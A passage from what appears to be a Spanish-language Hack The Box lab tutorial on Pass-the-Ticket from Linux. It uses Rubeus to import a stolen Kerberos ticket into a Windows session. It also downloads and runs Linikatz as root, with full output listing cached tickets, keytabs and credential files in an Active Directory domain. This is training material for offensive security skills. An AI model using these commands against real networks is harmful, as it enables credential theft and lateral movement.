### **Importar boleto convertido en la sesión de Windows con Rubeus**

Pase el boleto (PTT) de Linux

```
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free

```

---

# **Linikatz**

[Linikatz](https://github.com/CiscoCXSecurity/linikatz)es una herramienta creada por el equipo de seguridad de Cisco para explotar las credenciales en las máquinas Linux cuando hay una integración con Active Directory. En otras palabras, Linikatz aporta un principio similar a`Mimikatz`a entornos unix.

Solo como`Mimikatz`, Para aprovechar Linikatz, debemos ser root en la máquina. Esta herramienta extraerá todas las credenciales, incluidas las entradas de Kerberos, de diferentes implementaciones de Kerberos, como FreeIPA, SSSD, Samba, Vintella, etc. Una vez que extrae las credenciales, las coloca en una carpeta cuyo nombre comienza con`linikatz.`. Dentro de esta carpeta, encontrará las credenciales en los diferentes formatos disponibles, incluidos CCACHE y KeyTabs. Estos pueden usarse, según corresponda, como se explicó anteriormente.

### **Descarga y ejecución de Linikatz**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.shxnoxos@htb[/htb]$ /opt/linikatz.sh _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTBValid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
I: [check] KCM Kerberos tickets

```

---

# **Adelante**

Ahora que hemos visto cómo realizar varias técnicas de movimiento lateral de los hosts de Windows y Linux, nos sumergiremos en los archivos protegidos. Vale la pena probar todas estas técnicas de movimiento lateral hasta que se conviertan en una segunda naturaleza. Nunca se sabe con qué se encontrará durante una evaluación, y tener un extenso conjunto de herramientas es fundamental.